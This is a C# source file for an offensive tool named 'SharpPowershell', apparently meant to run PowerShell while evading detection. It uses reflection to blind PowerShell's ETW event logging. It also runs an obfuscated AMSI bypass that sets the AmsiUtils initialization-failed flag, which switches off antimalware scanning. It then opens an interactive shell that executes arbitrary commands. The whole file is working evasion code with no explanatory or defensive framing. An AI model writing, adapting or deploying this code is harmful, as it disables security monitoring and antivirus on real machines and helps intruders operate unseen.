using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System;
using System.IO;
using System.Reflection;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
namespace SharpPowershell
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace(); 
            rs.Open(); 
            PowerShell ps = PowerShell.Create(); 
            ps.Runspace = rs; Console.WriteLine(); 
            var PSEtwLogProvider = ps.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider"); 
            if (PSEtwLogProvider != null) { 
                var EtwProvider = PSEtwLogProvider.GetField("etwProvider", BindingFlags.NonPublic | BindingFlags.Static); 
                var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid()); EtwProvider.SetValue(null, EventProvider); 
            }
            String cmd = "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) { if ($b.Name -clike \"A*U*s\") {$c =$b; break} };$d =$c.GetFields('NonPublic,Static');Foreach($e in $d) { if ($e.Name -like \"*Init*\") {$f =$e} };$f.SetValue($null, $true);"; 
            ps.AddScript(cmd); 
            ps.Invoke(); 
            Console.Write("PS " + Directory.GetCurrentDirectory() + ">"); 
            while ((cmd = Console.ReadLine()) != null)
            {
                ps.AddScript(cmd); 
                try { 
                    
                    Collection<PSObject> psOutput = ps.Invoke();
                    
                    foreach (PSObject output in psOutput) { 
                        if (output != null) {
                            Console.WriteLine(output.ToString());
                        } 
                    }
                    Collection<ErrorRecord> errors = ps.Streams.Error.ReadAll();
                    foreach (ErrorRecord error in errors)
                    {
                        Console.WriteLine("**** ERROR ****");
                        Console.Error.WriteLine(error.ToString());
                    }
                } catch (Exception e) { 
                    Console.WriteLine("**** ERROR ****"); 
                    if (e.Message != null) { 
                        Console.WriteLine(e.Message); 
                    } 
                    ps.Stop(); 
                    ps.Commands.Clear(); 
                }
                ps.Commands.Clear(); 
                Console.Write("PS " + Directory.GetCurrentDirectory() + ">");
            }
            rs.Close();
        }
    }
}
